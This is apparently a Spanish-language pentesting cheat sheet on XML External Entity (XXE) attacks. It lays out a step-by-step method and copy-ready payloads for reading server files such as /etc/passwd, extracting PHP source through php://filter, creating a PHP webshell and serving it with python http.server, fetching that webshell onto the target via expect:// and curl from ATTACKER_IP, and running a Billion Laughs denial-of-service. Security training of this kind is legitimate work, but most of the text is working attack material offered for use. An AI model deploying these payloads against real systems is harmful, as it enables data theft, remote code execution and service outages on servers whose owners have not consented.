---
tags:
  - XXE
  - webapp
  - attack
  - RCE
---
## Conceptos Clave (TL;DR)

* Ocurre cuando una aplicación web confía en datos XML provenientes de la entrada del usuario sin aplicar filtros de sanitización.
* Permite referenciar un documento XML DTD externo para definir entidades personalizadas que apunten a archivos locales del servidor.
* Al inyectar la entidad en un campo que la aplicación muestra en pantalla, el servidor procesa y devuelve el contenido del archivo subyacente en la respuesta HTTP.
* Puede derivar en lectura de código fuente, Server-Side Request Forgery (SSRF), Ejecución Remota de Comandos (RCE) o Denegación de Servicio (DoS).

## Herramientas Clave

* **Burp Suite:** Para interceptar peticiones, modificar cabeceras `Content-Type`, inyectar payloads XML y utilizar la pestaña Inspector para decodificar respuestas en base64.
* **Python (http.server):** Para alojar y servir webshells o payloads maliciosos durante el proceso de escalamiento a RCE.

## Metodología Paso a Paso

1. **Identificación de Puntos de Inyección:**
   Intercepta el tráfico de la aplicación y busca formularios o endpoints que envíen datos. Revisa si la estructura de la petición utiliza formato XML. Inyecta un valor reconocible y verifica en qué parámetro de la respuesta HTTP se refleja dicho valor.


2. **Prueba de Inyección de Entidades (PoC Interna):**
   Declara un DTD (Document Type Definition) al inicio de la carga XML con una entidad personalizada simple. Llama a esta entidad dentro del campo vulnerable. Si la respuesta devuelve el valor definido en lugar del nombre de la entidad, se confirma la vulnerabilidad XXE.


3. **Explotación de Local File Disclosure (LFD):**
   Cambia la entidad interna por una externa usando la palabra clave `SYSTEM` seguida de la ruta del archivo local objetivo. Esto obliga al parser a leer el archivo y mostrar su contenido en el parámetro reflejado.


4. **Extracción de Código Fuente (Bypass de Sintaxis):**
   Si intentas leer archivos de código fuente (ej. `.php`) que contienen caracteres especiales de XML o datos binarios, la sintaxis se romperá y no obtendrás respuesta. Utiliza filtros de PHP para codificar el contenido en Base64 en el lado del servidor antes de que sea procesado por el parser XML.

  
5. **Escalamiento a Ejecución Remota de Comandos (RCE):**
   Si la aplicación está basada en PHP y el módulo `expect` está habilitado, puedes ejecutar comandos del sistema directamente. Para asegurar la ejecución, utiliza la vulnerabilidad para descargar una webshell desde tu servidor local al servidor objetivo.

## Cheat Sheet de Comandos

```xml
# PoC Básica: Definir y probar una entidad interna para confirmar XXE

<!DOCTYPE <ROOT_ELEMENT> [
<!ENTITY <ENTITY_NAME> "INJECTION_TEST">
]>

<!-- Llama a la entidad usando &<ENTITY_NAME>; en el campo vulnerable -->
```

```xml
# Local File Disclosure (LFD): Leer archivos sensibles del sistema

<!DOCTYPE email [
<!ENTITY name SYSTEM "file:///etc/passwd">
]>

<!-- Ejemplo de archivo: file:///etc/passwd o file:///c:/windows/win.ini -->
```

```xml
# Extracción de Código Fuente (Solo PHP): Leer archivos evadiendo caracteres especiales vía Base64

<!DOCTYPE <ROOT_ELEMENT> [

  <!ENTITY <ENTITY_NAME> SYSTEM "php://filter/convert.base64-encode/resource=<TARGET_FILE>.php">

]>

<!-- El output en base64 debe ser decodificado posteriormente (ej. en Burp Inspector) -->
```

```bash
# Preparación para RCE: Crear webshell local y levantar servidor HTTP

echo '<?php system($_REQUEST["cmd"]);?>' > <SHELL_NAME>.php

sudo python3 -m http.server <LOCAL_PORT>
```

```xml
# Ejecución Remota de Comandos (RCE): Descargar la webshell usando el módulo expect de PHP

<?xml version="1.0"?>

<!DOCTYPE <ROOT_ELEMENT> [

  <!ENTITY <ENTITY_NAME> SYSTEM "expect://curl$IFS-O$IFS'<ATTACKER_IP>:<LOCAL_PORT>/<SHELL_NAME>.php'">

]>

<!-- Nota: Se usa $IFS en lugar de espacios para evitar romper la sintaxis XML -->
```

```xml
# Denegación de Servicio (Billion Laughs Attack)

<?xml version="1.0"?>
<!DOCTYPE <ROOT_ELEMENT> [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>

<!-- Inyectar &a10; en el campo vulnerable agotará la memoria del servidor al procesar bucles recursivos -->
```


## "Gotchas" y Troubleshooting

* **Declaración de DOCTYPE preexistente:** Si la petición original ya incluye una declaración `DOCTYPE`, no agregues una nueva; simplemente inserta el elemento `ENTITY` dentro de la existente.
* **Bypass de Content-Type (JSON a XML):** Incluso si una aplicación web espera datos en formato JSON, podrías cambiar la cabecera `Content-Type` a `application/xml` y convertir el payload de JSON a XML. Si el servidor lo acepta, es posible que el endpoint sea vulnerable a XXE de forma no anticipada.
* **Listado de Directorios en Java:** En ciertas aplicaciones web basadas en Java, es posible especificar una ruta de directorio en lugar de un archivo para obtener un listado de los contenidos del directorio.
* **Limitaciones del módulo expect:** El módulo `expect` no está instalado ni habilitado por defecto en los servidores PHP modernos, por lo que el vector directo de RCE podría fallar frecuentemente. El enfoque principal siempre debe ser LFD y revelación de código fuente.
* **Caracteres prohibidos en expect:** Al ejecutar comandos mediante `expect://`, evita el uso de espacios (sustitúyelos por `$IFS`), tuberías (`|`), redirecciones (`>`) o llaves (`{`), ya que romperán la sintaxis del documento XML.
* **Mitigación en servidores modernos:** El ataque de Denegación de Servicio (Billion Laughs) no funciona en servidores web modernos como Apache, ya que cuentan con protecciones integradas contra la autoreferencia de entidades.
